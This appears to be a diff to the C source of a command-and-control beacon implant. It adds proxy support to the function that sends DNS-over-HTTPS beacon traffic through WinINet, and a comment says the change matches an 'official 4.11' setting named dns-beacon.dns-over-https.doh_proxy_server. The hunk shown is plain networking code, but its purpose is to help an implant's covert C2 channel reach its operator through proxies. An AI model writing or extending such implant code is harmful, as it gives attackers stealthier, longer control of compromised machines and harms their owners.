@@ -304,7 +304,19 @@ static int doh_exchange(unsigned char * query, int qlen,
 	flags |= INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE
 	         | INTERNET_FLAG_NO_AUTO_REDIRECT;
 
-	session = WI.InternetOpenA(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	/* C-56 (.dns-beacon.dns-over-https.doh_proxy_server): route the DoH
+	 * resolver requests through an HTTP proxy when configured (official 4.11);
+	 * empty = direct (previous behavior). */
+	{
+		char * doh_proxy = (char *)setting_ptr(SETTING_DOH_PROXY_SERVER);
+		int    doh_proxy_len = setting_len(SETTING_DOH_PROXY_SERVER);
+
+		if (doh_proxy != NULL && doh_proxy_len > 0 && doh_proxy[0] != ' ') {
+			session = WI.InternetOpenA(ua, INTERNET_OPEN_TYPE_PROXY, doh_proxy, NULL, 0);
+		} else {
+			session = WI.InternetOpenA(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+		}
+	}
 	if (session == NULL) {
 		spawn_log("doh exch InternetOpen gle=", (long)GetLastError());
 		goto done;
